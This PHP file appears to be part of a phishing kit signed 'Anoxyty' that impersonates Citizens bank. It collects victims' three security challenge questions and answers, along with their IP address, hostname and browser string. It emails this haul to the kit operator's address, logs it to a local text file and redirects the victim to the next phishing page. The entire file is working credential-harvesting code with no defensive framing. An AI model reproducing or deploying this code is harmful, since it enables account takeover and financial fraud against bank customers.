<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/

	ob_start();
session_start();
	include 'yours.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['q1'] ) ) {
		
		$_SESSION['q1'] 	  = $_POST['q1'];
		$_SESSION['ans1'] 	  = $_POST['ans1'];
		$_SESSION['q2'] 	  = $_POST['q2'];
		$_SESSION['ans2'] 	  = $_POST['ans2'];
		$_SESSION['q3'] 	  = $_POST['q3'];
		$_SESSION['ans3'] 	  = $_POST['ans3'];

		$code = <<<EOT
============== [ CITIZENS By Anoxyty | ]🔥 ==============
[Challenge Question 1] 		: {$_SESSION['q1']}
[Challenge Answer 1]		: {$_SESSION['ans1']}
[Challenge Question 2]		: {$_SESSION['q2']}
[Challenge Answer 2]		: {$_SESSION['ans2']}
[Challenge Question 3]		: {$_SESSION['q3']}
[Challenge Answer 3]		: {$_SESSION['ans3']}
	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./💼 CITIZENS By Anoxyty💼 ] =============
\r\n\r\n
EOT;

		$subject = "💼 CITIZENS Challenge By Anoxyty💼  From $ip";
        $headers = "From: 🍁Anoxyty🍁 <wellsby@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($yours,$subject,$code,$headers);

		$save = fopen("stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: emai.php?&sessionid={$_SESSION['randString']}&ue");
        exit();
	} else {
		header("Location: 404.php");
		exit();
	}
?>